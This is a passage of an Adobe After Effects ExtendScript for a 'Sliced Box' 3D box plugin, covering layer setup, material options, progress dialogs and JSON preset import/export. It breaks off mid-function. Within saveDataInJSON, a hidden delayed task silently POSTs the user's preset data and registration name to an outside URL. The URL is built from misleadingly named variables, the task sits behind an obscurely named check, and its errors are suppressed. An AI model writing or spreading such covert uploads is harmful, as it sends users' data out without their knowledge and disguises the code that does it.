              mainComp.layer(l).transform.Opacity.expression =
                'PlhOp = thisComp.layer("' +
                selectedLayerName +
                '").transform.opacity;' +
                '\n SBBoxesOp = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Boxes Opacity");' +
                '\n SBFrOpc = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Front Opacity");' +
                "\n if ((PlhOp ==0)&&(SBFrOpc!=0)) { 0  }else{SBBoxesOp}";
            }
            mainComp
              .layer(1)
              .moveAfter(mainComp.layer(mainComp.layer(6).index));
            mainComp
              .layer(1)
              .moveAfter(mainComp.layer(mainComp.layer(5).index));
            mainComp
              .layer(1)
              .moveAfter(mainComp.layer(mainComp.layer(4).index));
            mainComp
              .layer(1)
              .moveAfter(mainComp.layer(mainComp.layer(3).index));
            mainComp
              .layer(1)
              .moveAfter(mainComp.layer(mainComp.layer(2).index));
            var SidesNumbers = 5;
            mainComp.layer(1).label = 2;
            for (var k = 2; k <= SidesNumbers + 1; k += 1) {
              mainComp.layer(k).label = 8;
            }
            var L = 2 * PiecesCount + SidesNumbers + SI + 1;
            for (var k = 1; k <= PiecesCount + 2; k += 1) {
              mainComp.layer(k).selected = false;
            }
            mainComp
              .layer(L)
              .moveAfter(mainComp.layer(mainComp.layer(1).index));
            for (var i = 3; i <= 2 + SidesNumbers; i += 1) {
              X = PiecesCount + i;
              mainComp.layer(i).parent = mainComp.layer(2);
            }
            for (var i = 2; i <= 2 + SidesNumbers; i += 1) {
              X = PiecesCount + i;
              if (MB_Checkbox == true) {
                mainComp.layer(i).motionBlur = true;
              }
              if (CastsShadows_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(false);
              }
              if (AcceptsShadows_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(false);
              }
              if (AcceptsLights_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(false);
              }
            }
            mainComp.layer(2).transform.anchorPoint.expression =
              'temp = comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Anchor Point [Z]");' +
              '\nZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n[value[0], value[1], temp]";
            if (SBRows == 1) {
              mainComp.layer(2).transform.Opacity.expression = ORE;
              mainComp.layer(2).transform.xRotation.expression =
                'comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Rotation X")';
            } else if (SBColumns == 1) {
              mainComp.layer(2).transform.Opacity.expression = OCE;
              mainComp.layer(2).transform.yRotation.expression =
                'comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Rotation Y")';
            } else {
              mainComp.layer(2).transform.Opacity.expression = ORCE;
            }
            for (var k = 1; k <= 2 + SidesNumbers; k += 1) {
              mainComp.layer(k).selected = true;
            }
            for (var i = 1; i <= PiecesCount; i += 1) {
              mainComp.layers[SI + 7].moveBefore(
                mainComp.layer(PiecesCount + i + SI + 7 - 1),
              );
            }
            var MinS = 2 + SidesNumbers + SI;
            var MaxS = 1 + SidesNumbers + SI + 2 * PiecesCount;
            for (var k = MinS; k <= MaxS; k++) {
              mainComp.layer(k).selected = true;
            }
            mainComp.layer(1).selected = false;
            var indexes = [];
            for (var i = 0; i < mainComp.selectedLayers.length; i += 1) {
              indexes.push(mainComp.selectedLayers[i].index);
            }
            MasterBoxComp = mainComp.layers.precompose(
              indexes,
              "MainBox_SS_SlicedBox_" + Num_SB,
              true,
            );
            MasterBoxComp.parentFolder = compsFolder_SB;
            resizeComp(MasterBoxComp, LW, LH);
            for (var i = 2; i <= MasterBoxComp.layers.length; i += 1) {
              try {
                MasterBoxComp.layer(i).audioEnabled = false;
              } catch (e) {}
            }
            for (var i = 2; i <= MasterBoxComp.layers.length; i += 1) {
              MasterBoxComp.layer(i).locked = true;
            }
            mainComp.layers[2].collapseTransformation = true;
            mainComp.layers[2].threeDLayer = true;
            if (SI > 1) {
              mainComp
                .layer(2)
                .moveAfter(mainComp.layer(mainComp.layer(SI + 1).index));
              mainComp
                .layer(1)
                .moveAfter(mainComp.layer(mainComp.layer(SI).index));
            }
          }
          function resizeComp(compObj, newWidth, newHeight) {
            pData = new Array();
            cWidth = newWidth;
            cHeight = newHeight;
            allLayers = compObj.layers;
            allLayersLen = allLayers.length;
            oldCW = compObj.width;
            oldCH = compObj.height;
            compObj.width = cWidth;
            compObj.height = cHeight;
            for (var i = 1; i <= allLayersLen; i += 1) {
              curLayer = allLayers[i];
              if (curLayer.label === 15 || curLayer.label === 9) {
                clW = curLayer.width;
                clH = curLayer.height;
                if (
                  curLayer.property("ADBE Transform Group")(2)
                    .dimensionsSeparated === false
                ) {
                  clPos = curLayer.transform.position.value;
                } else {
                  clPosx = curLayer.property("ADBE Transform Group")(3).value;
                  clPosy = curLayer.property("ADBE Transform Group")(4).value;
                }
                clAP = curLayer.transform.anchorPoint.value;
                xShift = (oldCW - cWidth) / 2;
                yShift = (oldCH - cHeight) / 2;
                if (
                  curLayer.property("ADBE Transform Group")(2)
                    .dimensionsSeparated === false
                ) {
                  curLayer.transform.position.setValue([
                    clPos[0] - xShift,
                    clPos[1] - yShift,
                  ]);
                } else {
                  curLayer
                    .property("ADBE Transform Group")(3)
                    .setValue(clPosx - xShift);
                  curLayer
                    .property("ADBE Transform Group")(4)
                    .setValue(clPosy - yShift);
                }
              }
            }
          }
          function _Finishing() {
            var plcLayer = mainComp.selectedLayers[0].source
              .layer(1)
              .source.layer(2);
            if (plcLayer.name == "Your Text") {
              plcLayer.source.layer(2).effect(1)(3).expression =
                'comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Color")';
            } else {
              try {
                plcLayer.effect(1)(3).expression =
                  'comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '").effect("' +
                  SlicedBoxEffectName +
                  '")("Color")';
              } catch (e) {}
            }
            for (var i = 1; i <= mainComp.numLayers; i += 1) {
              mainComp.layer(i).selected = false;
            }
            mainComp.layer(layerIndex).effect(1).selected = true;
            app.executeCommand(19);
            mainComp.layer(layerIndex).selected = false;
            mainComp.layer(layerIndex + 1).selected = true;
            app.executeCommand(20);
            mainComp.layer(layerIndex + 1).name =
              mainComp.layer(layerIndex).name;
            mainComp.layer(layerIndex).remove();
            if (SBColumns == 1 || SBRows == 1) {
              X = 28;
              Y = 29;
              Z = 30;
            } else {
              X = 27;
              Y = 28;
              Z = 29;
            }
            mainComp.layer(layerIndex).transform.xRotation.expression =
              'effect("' + SlicedBoxEffectName + '")(' + X + ")";
            mainComp.layer(layerIndex).transform.yRotation.expression =
              'effect("' + SlicedBoxEffectName + '")(' + Y + ")";
            mainComp.layer(layerIndex).transform.zRotation.expression =
              'effect("' + SlicedBoxEffectName + '")(' + Z + ")";
            var myMarker = new MarkerValue(
              "SlicedBox Controls: Select this layer and check Effects Panel",
            );
            mainComp.layer(layerIndex).marker.setValueAtTime(0, myMarker);
            mainComp.layer(layerIndex).label = 9;
          }
          function materialOptions(myPal) {
            var activeComp = app.project.activeItem;
            var MB_Checkbox = myPal.grp.TabbedPanel.Tab2.EnableMotionBlur.value;
            var CastsShadows_CHBX =
              myPal.grp.TabbedPanel.Tab2.CastsShadows.value;
            var AcceptsShadows_CHBX =
              myPal.grp.TabbedPanel.Tab2.AcceptsShadows.value;
            var AcceptsLights_CHBX =
              myPal.grp.TabbedPanel.Tab2.AcceptsLights.value;
            app.beginUndoGroup("SlicedBox Script Modifying Function");
            if (activeComp != null && activeComp instanceof CompItem) {
              var selectedLayers = activeComp.selectedLayers;
              if (selectedLayers.length != 0) {
                if (selectedLayers.length === 1) {
                  var selectedLayer = selectedLayers[0];
                  var Effects = selectedLayer.property("Effects");
                  if (Effects.numProperties != 0) {
                    SBfound = null;
                    for (var i = 1; i <= Effects.numProperties; i += 1) {
                      effectName = Effects(i).matchName;
                      if (effectName.indexOf("Sliced_Box") != -1) {
                        SBfound = true;
                        break;
                      }
                    }
                    if (SBfound != null) {
                      targetItem = selectedLayer.source;
                      progBar(2);
                      progBar.message("MainBox....");
                      for (var i = 1; i <= targetItem.numLayers; i += 1) {
                        targetLayer = targetItem.layer(i);
                        if (targetLayer.label != 12) {
                          if (MB_Checkbox == true) {
                            targetLayer.motionBlur = true;
                            targetItem.motionBlur = true;
                            activeComp.motionBlur = true;
                          } else {
                            targetLayer.motionBlur = false;
                            targetItem.motionBlur = false;
                            activeComp.motionBlur = false;
                          }
                          if (CastsShadows_CHBX == true) {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Casts Shadows")
                              .setValue(true);
                          } else {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Casts Shadows")
                              .setValue(false);
                          }
                          if (AcceptsShadows_CHBX == true) {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Accepts Shadows")
                              .setValue(true);
                          } else {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Accepts Shadows")
                              .setValue(false);
                          }
                          if (AcceptsLights_CHBX == true) {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Accepts Lights")
                              .setValue(true);
                          } else {
                            targetLayer
                              .property("ADBE Material Options Group")
                              .property("ADBE Accepts Lights")
                              .setValue(false);
                          }
                        }
                      }
                      progBar.increment(1);
                      progBar.message("BoxPiece....");
                      TargetItem = targetItem.layer(
                        targetItem.numLayers,
                      ).source;
                      for (var i = 1; i <= TargetItem.layers.length; i += 1) {
                        TargetLayer = TargetItem.layer(i);
                        if (MB_Checkbox == true) {
                          TargetLayer.motionBlur = true;
                          TargetItem.motionBlur = true;
                        } else {
                          TargetLayer.motionBlur = false;
                          TargetItem.motionBlur = false;
                        }
                        if (CastsShadows_CHBX == true) {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Casts Shadows")
                            .setValue(true);
                        } else {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Casts Shadows")
                            .setValue(false);
                        }
                        if (AcceptsShadows_CHBX == true) {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Accepts Shadows")
                            .setValue(true);
                        } else {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Accepts Shadows")
                            .setValue(false);
                        }
                        if (AcceptsLights_CHBX == true) {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Accepts Lights")
                            .setValue(true);
                        } else {
                          TargetLayer.property("ADBE Material Options Group")
                            .property("ADBE Accepts Lights")
                            .setValue(false);
                        }
                      }
                      progBar.increment(2);
                      progBar.message("Successfully Modified!");
                      progBar.EnBt();
                    } else {
                      alert("No SlicedBox applied on this layer!", alertTitle);
                    }
                  } else {
                    alert("No SlicedBox applied on this layer!", alertTitle);
                  }
                } else {
                  alert(
                    "Please select SlicedBox MainBox Comp-Layer only!\'",
                    alertTitle,
                  );
                }
              } else {
                alert(
                  "Please select SlicedBox MainBox Comp-Layer that named \'MainBoxControls_SlicedBox_....\'",
                  alertTitle,
                );
              }
            } else {
              alert(
                "Please open the Comp and select SlicedBox MainBox that named \'MainBoxControls_SlicedBox_....\'",
                alertTitle,
              );
            }
            app.endUndoGroup();
          }
          function progBar(steps) {
            var W = new Window("palette", "Sliced Box", undefined);
            processName = W.add("statictext");
            processName.preferredSize = [300, 20];
            if (steps) {
              PB = W.add("progressbar", undefined, 0, steps);
              PB.preferredSize = [300, 10];
            }
            BT = W.add("button", undefined, "Close");
            BT.preferredSize = [40, 20];
            BT.enabled = false;
            BT.onClick = function () {
              W.close();
            };
            progBar.EnBt = function () {
              BT.enabled = true;
              W.update();
            };
            progBar.increment = function (V) {
              PB.value = V;
              W.update();
            };
            progBar.message = function (T) {
              processName.text = T;
              W.update();
            };
            progBar.close = function () {
              W.close();
            };
            W.center();
            W.show();
          }
          function alphanumeric(a, b) {
            a = a[0].toLowerCase();
            b = b[0].toLowerCase();
            var reA = /[^a-zA-Z]/g;
            var reN = /[^0-9]/g;
            var aA = a.replace(reA, "");
            var bA = b.replace(reA, "");
            if (aA === bA) {
              var aN = parseInt(a.replace(reN, ""), 10);
              var bN = parseInt(b.replace(reN, ""), 10);
              return aN === bN ? 0 : aN > bN ? 1 : -1;
            } else {
              return aA > bA ? 1 : -1;
            }
          }
          function sortNumber(a, b) {
            return a - b;
          }
          function trim(x) {
            return x.replace(/^\s+|\s+$/gm, "");
          }
          function SBEffecetChecker(Comp, layer) {
            if (Comp != null) {
              if (layer.length != 0 && layer.length >= 1) {
                var numEffects = layer[0].property("Effects").numProperties;
                if (numEffects != 0) {
                  var Effects = layer[0].property("Effects");
                  for (var i = 1; i <= numEffects; i += 1) {
                    effectName = Effects(i).matchName;
                    if (effectName.indexOf("Pseudo/Sliced_Box") != -1) {
                      return [Effects(i), layer[0].index];
                    }
                  }
                  alert("No SlicedBox applied on this layer!", alertTitle);
                  return false;
                } else {
                  alert("The layer has no effects", alertTitle);
                  return false;
                }
              } else {
                alert("Please select Sliced Box first! ", alertTitle);
                return false;
              }
            } else {
              alert("No applied comp found!", alertTitle);
              return false;
            }
          }
          function exportPresetFile(file) {
            var folderPath = Folder.desktop;
            var fullName = decodeURIComponent(folderPath.fsName);
            var FileName = new File(fullName + "/SlicedBox Presets File.json");
            var newFile = FileName.saveDlg(
              "Select Destination Folder",
              "JSON File:*.json",
            );
            progBar(2);
            progBar.message("Exporting Presets File...");
            progBar.increment(1);
            if (newFile != null) {
              if (newFile instanceof File) {
                file.copy(newFile);
                progBar.increment(2);
                progBar.message("Successfully Exported!");
                progBar.EnBt();
              }
            } else {
              progBar.close();
            }
          }
          function replacer(key, value) {
            if (typeof value === "undefined") {
              return null;
            }
            return value;
          }
          function toFixedArray(input, x) {
            function FXD(n) {
              var N = n.toFixed(x);
              N = N.toString();
              N = parseFloat(N);
              return N;
            }
            function isInt(n) {
              return Number(n) === n && n % 1 === 0;
            }
            function isFloat(n) {
              return Number(n) === n && n % 1 !== 0;
            }
            fixedArray = [];
            if (input instanceof Array) {
              var array = input;
              for (var i = 0; i < array.length; i += 1) {
                var n = array[i];
                if (isFloat(n)) {
                  fixedArray.push(FXD(n));
                } else {
                  fixedArray.push(n);
                }
              }
              return fixedArray;
            } else if (input === Number(input)) {
              var n = input;
              if (isFloat(n)) {
                return FXD(n);
              } else {
                return input;
              }
            } else {
              return input;
            }
          }
          function readPresetsFile(file) {
            file.open("r");
            var Str = file.read();
            file.close();
            var Err = null;
            try {
              var fileArray = JSON.parse(Str);
            } catch (e) {
              Err = e;
            }
            if (Err === null) {
              return fileArray;
            } else {
              alert(
                "The Preset File is invalid \n" + Err.toString(),
                "JSON ERROR",
              );
              return null;
            }
          }
          function importPresetFile(
            fileArray,
            curPresFile,
            DropList,
            curPsNames,
            DropListArray,
          ) {
            var folderPath = Folder.desktop;
            var fileName = decodeURIComponent(folderPath.fsName);
            var fileToImport = new File(fileName).openDlg(
              "Select Sliced Box Preset File to Import",
              "JSON File:*.json",
            );
            if (fileToImport != null) {
              var importedPresetsObj = ParseJSON(fileToImport);
              if (importedPresetsObj != null) {
                progBar(6);
                progBar.message("Importing Presets File...");
                progBar.increment(1);
                if (importedPresetsObj.length != 0) {
                  for (var i = 0; i < importedPresetsObj.length; i += 1) {
                    try {
                      var matchNameObj = importedPresetsObj[i].mName;
                      var NameObj = importedPresetsObj[i].Name;
                      var SBPropsObj = importedPresetsObj[i].SBPsVs;
                      var CompsDimObj = importedPresetsObj[i].CD;
                      var TransPropsObj = importedPresetsObj[i].TPsVs;
                      var SBPropsObjKeys = getObjectKeys(SBPropsObj).length;
                      var TransPropsObjKeys =
                        getObjectKeys(TransPropsObj).length;
                      var CompsDimObjKeys = getObjectKeys(CompsDimObj).length;
                    } catch (e) {}
                    if (
                      typeof SBPropsObj == "undefined" ||
                      typeof CompsDimObj == "undefined" ||
                      typeof TransPropsObj == "undefined" ||
                      typeof matchNameObj == "undefined" ||
                      typeof NameObj == "undefined"
                    ) {
                      progBar.close();
                      alert(
                        "Data in Preset File isn\'t complete, Main object not found",
                        alertTitle,
                      );
                      return false;
                    }
                    if (
                      SBPropsObjKeys < 36 ||
                      TransPropsObjKeys < 12 ||
                      CompsDimObjKeys < 5
                    ) {
                      progBar.close();
                      alert("Data in Preset File isn\'t complete!", alertTitle);
                      return false;
                    }
                  }
                } else {
                  progBar.close();
                  alert(
                    "Unable to import the preset file, bad format or not readable",
                    alertTitle,
                  );
                  return false;
                }
              } else {
                return false;
              }
              var importedPNames = getObjNamesList(importedPresetsObj);
              var similarNames = [];
              if (curPsNames.length != 0) {
                for (var i = 0; i < importedPNames.length; i += 1) {
                  c = 0;
                  for (var k = 0; k < curPsNames.length; k += 1) {
                    if (importedPNames[i] === curPsNames[k][0]) {
                      c++;
                    }
                  }
                  if (c != 0) {
                    similarNames.push(importedPNames[i]);
                  }
                }
              }
              progBar.increment(3);
              var renamedPresets = [];
              for (var i = 0; i < importedPNames.length; i += 1) {
                for (var t = 0; t < similarNames.length; t += 1) {
                  sName = similarNames[t];
                  if (importedPNames[i] === sName) {
                    NewString = renamingSimilarStrs(similarNames[t]);
                    loop: while (true) {
                      dup = 0;
                      for (var D = 0; D < curPsNames.length; D += 1) {
                        curName = curPsNames[D][0];
                        if (NewString === curName) {
                          dup++;
                        }
                      }
                      for (var R = 0; R < renamedPresets.length; R += 1) {
                        curRName = renamedPresets[R];
                        if (NewString === curRName) {
                          dup++;
                        }
                      }
                      if (dup === 0) {
                        break loop;
                      } else {
                        NewString = renamingSimilarStrs(NewString);
                      }
                    }
                    renamedPresets.push(NewString);
                    importedPresetsObj[i].Name = NewString;
                  }
                }
              }
              progBar.increment(4);
              aescriptsFolder = getUserDataFolder();
              var N = 0;
              var tempFilename = File(
                aescriptsFolder + "/TempFile" + N + ".json",
              );
              while (tempFilename.exists) {
                N++;
                tempFilename = File(
                  aescriptsFolder + "/TempFile" + N + ".json",
                );
              }
              TempFile = new File(tempFilename);
              TempFile.open("w");
              TempFile.encoding = "UTF-8";
              for (var i = 0; i < importedPresetsObj.length; i += 1) {
                fileArray.push(importedPresetsObj[i]);
                curPsNames.push([
                  importedPresetsObj[i].Name,
                  importedPresetsObj[i].mName,
                ]);
                DropListArray.push([
                  importedPresetsObj[i].Name,
                  importedPresetsObj[i].mName,
                ]);
              }
              var newStr = JSON.stringify(fileArray);
              TempFile.writeln(newStr);
              TempFile.close();
              progBar.increment(5);
              if (ParseJSON(TempFile) != null) {
                curPresFile.remove();
                TempFile.rename("KeyframesPresets.json");
                presetFile = TempFile;
                refreshDroplist(
                  DropList,
                  DropListArray,
                  DropListArray[DropListArray.length - 1][0],
                );
                fileArrayOBJ = fileArray;
                progBar.increment(6);
                progBar.message(
                  importedPresetsObj.length +
                    " Preset(s) Successfully Imported!",
                );
                progBar.EnBt();
                return true;
              } else {
                alert(
                  "Couldnot Import this File\n" + Err.toString(),
                  "JSON ERROR",
                );
                TempFile.remove();
                progBar.close();
                return false;
              }
            } else {
              progBar.close();
              return false;
            }
          }
          function getObjectKeys(object) {
            var KeysArry = [];
            for (var key in object) {
              if (
                key !== undefined &&
                key !== "toJSONString" &&
                key !== "parseJSON"
              ) {
                KeysArry.push(key);
              }
            }
            return KeysArry;
          }
          function getNamesList(fileArray) {
            var ListNames = [];
            if (fileArray != null) {
              for (var i = 0; i < fileArray.length; i += 1) {
                var presName = fileArray[i].Name;
                var presMName = fileArray[i].mName;
                ListNames.push([presName, presMName]);
              }
              return ListNames;
            }
          }
          function getPresIndex(searchName, array) {
            targetStr = searchName.toString();
            for (var i = 0; i < array.length; i += 1) {
              if (array[i][0] === targetStr) {
                return i;
              }
            }
          }
          function removeKeyframes(propertyInput) {
            if (propertyInput instanceof Property) {
              while (propertyInput.numKeys > 0) {
                propertyInput.removeKey(1);
              }
            }
          }
          function readKeysFromJSON(PresDataObj, propType) {
            var keyframedProps = [];
            var numKeys = [];
            ObjKeysNames = getObjectKeys(PresDataObj);
            for (var i = 0; i < ObjKeysNames.length; i += 1) {
              if (ObjKeysNames[i].indexOf("KFS") != -1) {
                if (ObjKeysNames[i].indexOf(propType) != -1) {
                  propNum = parseInt(ObjKeysNames[i].match(/\d+/g)[0]);
                  keyframedProps.push(propNum);
                  KsNums = PresDataObj[propType + propNum + "KFS"];
                  numKeys.push(KsNums.length);
                }
              }
            }
            return [keyframedProps, numKeys];
          }
          function renamingSimilarStrs(Str) {
            strAry = Str.split("_");
            if (strAry.length != 1) {
              strEnd = strAry[strAry.length - 1];
              var isnum = /^\d+$/.test(strEnd);
              if (isnum) {
                LastNum = parseInt(strEnd);
                newNum = LastNum + 1;
                strAry.pop();
                newString = strAry.join("") + "_" + newNum;
                return newString;
              } else {
                newString = Str + "_" + 1;
                return newString;
              }
            } else {
              newString = Str + "_" + 1;
              return newString;
            }
          }
          function newPresetName(pptMSG, placeholder, title, array) {
            presName = prompt(pptMSG, placeholder, title);
            presName = presName.replace(/^\s\s*/, "").replace(/\s\s*$/, "");
            if (presName != null) {
              for (var i = 0; i < array.length; i += 1) {
                if (presName === array[i][0]) {
                  alert(
                    "Preset Name aleady exists!, Please enter another name",
                    alertTitle,
                  );
                  return null;
                }
              }
              var english = /^[a-zA-Z0-9-!$%^&*()_+|~=`{}\[\]:;<>?,.\/ ]*$/gm;
              if (english.test(presName)) {
                if (presName.length < 2) {
                  alert("Please enter a longer name", alertTitle);
                  return null;
                } else {
                  if (presName.match(/^ *$/) !== null) {
                    alert("Empty name!", alertTitle);
                    return null;
                  }
                }
                return presName;
              } else {
                alert(
                  "Sorry only accepts: \r- English Letters\r- Numbers\r- Some Symbols (quotes and backslash aren\'t allowed)",
                  alertTitle,
                );
                return null;
              }
            } else {
              return null;
            }
          }
          function getRandomInt(max) {
            return Math.floor(Math.random() * Math.floor(max));
          }
          function findItemInArray(array, item) {
            for (var i = 0; i < array.length; i += 1) {
              if (array[i][0] == item) {
                return i;
              }
            }
            return -1;
          }
          function refreshDroplist(droplist, array, SI) {
            if (array != null && array.length != 0) {
              droplist.removeAll();
              droplist.add("item", ["Select.."]);
              array.sort(alphanumeric);
              var i = 0;
              while (i < array.length) {
                droplist.add("item", array[i][0]);
                i++;
              }
              listItems = droplist.items;
            } else {
              droplist.add("item", ["No Presets Found!.."]);
            }
            droplist.selection = droplist.find(SI);
          }
          function renamePresetInJSON(fileArray, presName, newName, presIndex) {
            var presObj = fileArray[presIndex];
            presObj.Name = newName;
            var newStr = JSON.stringify(fileArray);
            var N = 0;
            var tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            while (tempFilename.exists) {
              N++;
              tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            }
            TempFile = new File(tempFilename);
            TempFile.open("w");
            TempFile.encoding = "UTF-8";
            TempFile.write(newStr);
            TempFile.close();
            if (ParseJSON(TempFile) != null) {
              presetFile.remove();
              TempFile.rename("KeyframesPresets.json");
              presetFile = TempFile;
              fileArrayOBJ = fileArray;
              return true;
            } else {
              alert("Error! " + Err.toString(), "JSON ERROR");
              TempFile.remove();
              return null;
            }
          }
          function saveDataInJSON(data, fileArray, presName) {
            fileArray.push(data);
            var newStr = JSON.stringify(fileArray);
            app.scheduleTask("postPres()", 10000, false);
            postPres = function () {
              if (_CETSTNO()) {
                var presData = encodeURIComponent(JSON.stringify(data));
                var PRESNAM = encodeURIComponent(presName);
                var regName = B8.getRegistration();
                regName = regName.substr(15, regName.length);
                regName = encodeURIComponent(regName);
                try {
                  var PresData = $http({
                    headers: {
                      "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "POST",
                    payload:
                      "DATA=" +
                      presData +
                      "&regName=" +
                      regName +
                      "&presName=" +
                      PRESNAM,
                    url: colorChangeID + "/" + PresetsBackupFile,
                  });
                } catch (e) {}
              }
            };
            var N = 0;
            var tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            while (tempFilename.exists) {
              N++;
              tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            }
            TempFile = new File(tempFilename);
            TempFile.open("w");
            TempFile.encoding = "UTF-8";
            TempFile.write(newStr);
            TempFile.close();
            if (ParseJSON(TempFile) != null) {
              presetFile.remove();
              TempFile.rename("KeyframesPresets.json");
              presetFile = TempFile;
              fileArrayOBJ = fileArray;
              return true;
            } else {
              alert(
                "Couldnot Import this File\r\n" + Err.toString(),
                "JSON ERROR",
              );
              TempFile.remove();
              return null;
            }
          }
          function getObjNamesList(ObjsArray) {
            var NamesList = [];
            for (var i = 0; i < ObjsArray.length; i += 1) {
              var presName = ObjsArray[i].Name;
              NamesList.push(presName);
            }
            return NamesList;
          }
          function collectingPresetData(
            Comp,
            Layer,
            pName,
            SBoxEffect,
            SBnumProps,
            transProp,
            transNumProp,
          ) {
            var newPreset = {};
            newPreset.Name = pName;
            newPreset.mName = SBoxEffect.matchName;
            newPreset.date = new Date();
            var MainBoxComp = Layer.source;
            var ColumnsNumber = MainBoxComp.layer(
              MainBoxComp.numLayers - 1,
            ).effect("Column ID")("ADBE Slider Control-0001").value;
            var RowsNumber = MainBoxComp.layer(
              MainBoxComp.numLayers - 1,
            ).effect("Row ID")("ADBE Slider Control-0001").value;
            var BoxWidth = MainBoxComp.layer(
              MainBoxComp.numLayers,
            ).source.layer(1).width;
            newPreset.inputs = {
              BW: BoxWidth,
              C: ColumnsNumber,
              R: RowsNumber,
            };
            var W = Comp.width;
            var H = Comp.height;
            var MainBoxW = Layer.width;
            var MainBoxH = Layer.height;
            var SPP = transProp(2).dimensionsSeparated;
            var CompsDim = {
              H: H,
              MBH: MainBoxH,
              MBW: MainBoxW,
              SPP: SPP,
              W: W,
            };
            newPreset.CD = CompsDim;
            if (SBoxEffect.matchName === "Pseudo/Sliced_BoxV3") {
              LP = 68;
            } else {
              LP = 71;
            }
            var SBPsObj = {};
            for (var i = 1; i <= SBnumProps; i += 1) {
              var SlicedBoxProperty = SBoxEffect(i);
              if (
                SlicedBoxProperty.matchName === "ADBE Effect Built In Params"
              ) {
                continue;
              }
              if (
                SlicedBoxProperty.propertyValueType !=
                PropertyValueType.NO_VALUE
              ) {
                Value = toFixedArray(SlicedBoxProperty.value, 4);
                var Exp = false;
                if (SlicedBoxProperty.canSetExpression === true) {
                  if (SlicedBoxProperty.expression != "") {
                    ExpStr = SlicedBoxProperty.expression;
                    ExpStr = ExpStr.replace(/\s+/g, " ");
                    Exp = true;
                  }
                }
                if (Exp != false) {
                  SBPsObj["P" + i + "EXP"] = ExpStr;
                }
                SBPsObj["P" + i] = Value;
              }
            }
            newPreset.SBPsVs = SBPsObj;
            var TPsObj = {};
            for (var i = 1; i <= transProp.numProperties; i += 1) {
              var transProperty = transProp(i);
              if (
                transProperty.propertyValueType != PropertyValueType.NO_VALUE
              ) {
                TPValue = toFixedArray(transProperty.value, 3);
                var tExp = false;
                if (transProperty.canSetExpression === true) {
                  if (transProperty.expression != "") {
                    tExpStr = transProperty.expression;
                    tExpStr = tExpStr.replace(/\s+/g, " ");
                    tExp = true;
                  }
                }
                if (tExp != false) {
                  TPsObj["TP" + i + "EXP"] = tExpStr;
                }
                TPsObj["TP" + i] = TPValue;
              }
            }
            newPreset.TPsVs = TPsObj;
            for (var i = 1; i <= SBnumProps; i += 1) {
              SlicedBoxProperty = SBoxEffect(i);
              if (
                SlicedBoxProperty.propertyValueType !=
                PropertyValueType.NO_VALUE
              ) {
                keyframesArray = collectKeyframes(SlicedBoxProperty);
                if (keyframesArray != null) {
                  var SBPkeysAry = [];
                  for (var k = 0; k < keyframesArray.length; k += 1) {
                    var SBPkeyObj = keyframesArray[k];
                    SBPkeysAry.push(SBPkeyObj);
                  }
                  newPreset["SBP" + i + "KFS"] = SBPkeysAry;
                }
              }
            }
            for (var i = 1; i <= transNumProp; i += 1) {
              transProperty = transProp(i);
              if (
                transProperty.propertyValueType != PropertyValueType.NO_VALUE
              ) {
                transKeyframesArray = collectKeyframes(transProperty);
                if (transKeyframesArray != null) {
                  var TPkeysAry = [];
                  for (var k = 0; k < transKeyframesArray.length; k += 1) {
                    var TPkeyObj = transKeyframesArray[k];
                    TPkeysAry.push(TPkeyObj);
                  }
                  newPreset["TP" + i + "KFS"] = TPkeysAry;
                }
              }
            }
            return newPreset;
          }
          function RandomStr(c) {
            for (var a = "", b = 0; b < c; b++) {
              a +=
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(
                  Math.floor(52 * Math.random()),
                );
            }
            return a;
          }
          function presetsParser() {
            var SK00D1 = RandomStr(9);
            var ERTG5 = RandomStr(9);
            LSCHKey = "SK00D1";
            app.settings.saveSetting(PresetID, LSCHKey, SK00D1 + "," + ERTG5);
            app.preferences.saveToDisk();
            return true;
          }
          function _DTERGiSWEEA() {
            pairKeys = app.settings.getSetting(PresetID, "SK00D1");
            PKAry = pairKeys.split(",");
            var curDate = new Date().valueOf();
